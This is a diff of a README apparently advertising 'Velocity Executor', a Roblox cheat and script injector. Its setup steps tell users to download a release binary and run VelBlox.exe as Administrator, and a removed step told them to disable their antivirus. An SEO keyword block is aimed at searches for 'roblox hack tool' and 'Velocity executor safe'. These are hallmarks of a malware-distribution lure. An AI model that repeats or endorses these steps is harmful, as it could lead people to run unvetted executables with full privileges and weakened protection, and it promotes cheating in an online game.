@@ -37,10 +37,8 @@ Mobile version coming soon. Stay tuned!
 
 ### PC:
 1. Click the **Download** button above or [go here directly](https://github.com/thakur-works/Velocity-Executor/releases/latest).
-2. Disable antivirus temporarily (false positives may occur).
-3. Extract the ZIP archive.
-4. Run `VelBlox.exe` as Administrator.
-5. Open Roblox, then inject and run your Lua scripts.
+2. Run `VelBlox.exe` as Administrator.
+3. Open Roblox, then inject and run your Lua scripts.
 
 ---
 
@@ -54,7 +52,7 @@ Mobile version coming soon. Stay tuned!
 
 ## 🧠 SEO Targeted Keywords
 
-free roblox executor, Velocity executor, roblox script executor 2025, no key roblox exploit, level 8 roblox executor, download Velocity executor, Velocity roblox hack tool, roblox injector for pc, Velocity executor safe
+free roblox executor, Velocity executor, roblox script executor 2026, no key roblox exploit, level 8 roblox executor, download Velocity executor, Velocity roblox hack tool, roblox injector for pc, Velocity executor safe
 
 ---
 
